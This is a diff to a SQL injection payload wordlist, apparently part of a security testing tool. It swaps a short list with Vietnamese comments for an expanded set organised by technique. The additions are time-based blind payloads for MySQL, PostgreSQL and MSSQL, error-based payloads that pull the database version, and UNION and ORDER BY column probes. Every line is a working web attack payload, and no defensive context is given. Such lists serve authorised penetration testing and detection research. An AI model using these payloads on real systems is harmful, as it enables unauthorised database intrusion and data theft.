@@ -1,20 +1,45 @@
-# Error-Based Payloads (Nhanh nhất)
-'
-"
-' OR 1=1--
-" OR 1=1--
-') OR ('1'='1--
-ORDER BY 1--
-ORDER BY 100--
-
-# Boolean-Based Payloads (Dựa vào sự thay đổi nội dung)
-' OR 1=1--
-' OR 1=2--
+# === Time-Based Blind Payloads (Most Reliable) ===
+' AND SLEEP(3)--
 ' AND 1=1--
 ' AND 1=2--
-
-# Time-Based Payloads (Dựa vào thời gian phản hồi, chậm nhưng hiệu quả)
+' AND (SELECT 1 FROM (SELECT SLEEP(3))x)--
+') AND SLEEP(3)--
+' OR 1=1--
+' OR SLEEP(3)--
+1 AND SLEEP(3)--
+1 OR SLEEP(3)--
+# --- MySQL ---
+# String-based
 ' AND SLEEP(5)--
 " AND SLEEP(5)--
-' OR SLEEP(5)--
-") OR SLEEP(5)--
+') AND SLEEP(5)--
+") AND SLEEP(5)--
+# Numeric-based
+ AND SLEEP(5)--
+OR SLEEP(5)--
+
+# --- PostgreSQL ---
+# String-based
+' AND pg_sleep(5)--
+" AND pg_sleep(5)--
+# Numeric-based
+ AND pg_sleep(5)--
+OR pg_sleep(5)--
+
+# --- MSSQL ---
+# String-based
+'; WAITFOR DELAY '0:0:5'--
+"; WAITFOR DELAY '0:0:5'--
+# Numeric-based
+ WAITFOR DELAY '0:0:5'--
+
+# === Error-Based Payloads (Fastest if they work) ===
+' AND 1=CONVERT(int, (SELECT @@version))--
+" AND 1=CONVERT(int, (SELECT @@version))--
+' OR 1/0 --
+1/0 --
+
+# === Basic UNION/ORDER BY Payloads ===
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' ORDER BY 1--
+' ORDER BY 100--
